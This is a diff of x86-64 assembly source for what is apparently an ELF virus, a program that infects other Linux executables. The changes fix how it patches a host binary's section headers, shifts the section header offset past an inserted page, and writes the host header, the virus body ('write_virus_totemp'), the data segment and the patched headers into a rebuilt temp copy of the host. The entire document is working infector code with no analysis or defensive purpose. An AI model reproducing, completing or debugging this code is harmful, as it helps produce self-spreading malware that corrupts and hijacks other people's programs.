@@ -293,7 +293,9 @@ textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;variables used for phdr and shdr manipulation routines
 
 evaddr: dq 0
-oshoff: dq 0
+
+;original section header offset
+oshoff: dd 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
@@ -304,10 +306,12 @@ data_offset_padding_size: dd 0
 
 ;DATA_OFFSET_HOST equ data_offset_original
 DATA_OFFSET_HOST: dq 0
+SHDR_OFFSET_HOST: dq 0
 ;padding2data_segment equ	data_offset_new_padding-data_offset_original
 
 vxhostentry: dq 0
 vxoffset: dd 0
+vxshoff: dd 0
 ventry equ $_start 
 
 
@@ -820,6 +824,7 @@ infect:
 	xor r11, r11
 	xor rcx, rcx
 	mov word cx, [r13 + elf_ehdr.e_shnum]
+
 	check_shdrs:
 		.shdr_loop:
 			cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
@@ -830,7 +835,7 @@ infect:
 			jne .mod_subsequent_shdr
 		;	add word [r13 + r15 + elf_shdr.sh_size], vlen
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
-			add dword r10d, [vlen]
+			add dword r10d, vlen
 			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
 
 			.mod_subsequent_shdr:
@@ -843,14 +848,18 @@ infect:
 			add r12w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			cmp cx, 0
 			jg .shdr_loop
-	mov r11, qword [r13 + elf_ehdr.e_shoff]
-	mov qword [oshoff], r11
+;	lea r10, [r13 + elf_ehdr.e_shoff]
+	;mov [SHDR_OFFSET_HOST], r10
+	mov r11, [r13 + elf_ehdr.e_shoff]
+;	mov qword [SHDR_OFFSET_HOST], r11
+	mov dword [oshoff], r11d
 	cmp dword r11d, [vxoffset]
 	jg .patch_ehdr_shoff
 	jmp fin_infect
 	.patch_ehdr_shoff:
 		add dword r11d, [PAGESIZE]
 		mov dword [r13 + elf_ehdr.e_shoff], r11d
+		mov dword [vxshoff], r11d
 		jmp frankenstein_elf
 	
 
@@ -908,6 +917,7 @@ frankenstein_elf:
 	mov r9, rax
 	mov rdi, rax
 
+	xor rdx, rdx
 	;write ELF header to temp file
 	;actually just write the first 1024 bytes of target ELF to temp file
 
@@ -925,7 +935,8 @@ frankenstein_elf:
 		;mov rdx, [hostentry_offset]
 		;mov rdx, [hosttext_start]
 		;mov rdx, [evaddr]
-		mov rdx, [vxoffset]
+		;mov rdx, [vxoffset]
+		add dword edx, [vxoffset]
 		jmp .write_host_ehdr_phdrs_textsegment
 	.offset_ehdr_phdr_copy_pagesize:
 		;mov rdx, textsegmentoffset_pageyes_len
@@ -940,7 +951,8 @@ frankenstein_elf:
 		;mov rdx, 512
 		;mov rdx, 64
 		;mov rdx, 1024
-		mov rsi, r13					;r13 contains pointer to mmap'd file
+		mov rdi, r9
+		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
 
@@ -985,9 +997,9 @@ frankenstein_elf:
 	;	syscall
 	.write_virus_totemp:
 		mov rdx, vlen
-		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
 		mov rsi, _start
-		mov r10, [vxoffset]
+		mov r10d, [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
 
@@ -1003,9 +1015,11 @@ frankenstein_elf:
 		;sub rsi, data_offset_original
 		mov rax, SYS_FTRUNCATE
 		syscall
-		
-	.write_datasegment_shdrs_totemp:
-		mov rdx, [r14 + filestat.st_size]
+		jmp .close_temp		
+	.write_datasegment_totemp:
+		;mov rdx, [r14 + filestat.st_size]
+		;mov rdx, [SHDR_OFFSET_HOST]
+		mov rdx, [r13 + elf_ehdr.e_shoff]
 		sub edx, dword [data_offset_original]
 
 		;pop rsi		
@@ -1021,6 +1035,15 @@ frankenstein_elf:
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
+
+	.write_patched_shdrs_totemp:
+		mov rdx, [r14 + filestat.st_size]
+		sub edx, dword [oshoff]
+		mov rsi, [SHDR_OFFSET_HOST]
+		mov r10d, [vxshoff]
+		mov rax, SYS_PWRITE64
+		syscall
+
 		
 		;munmap file from work area
 		;mov qword rsi, [elf_filesize]
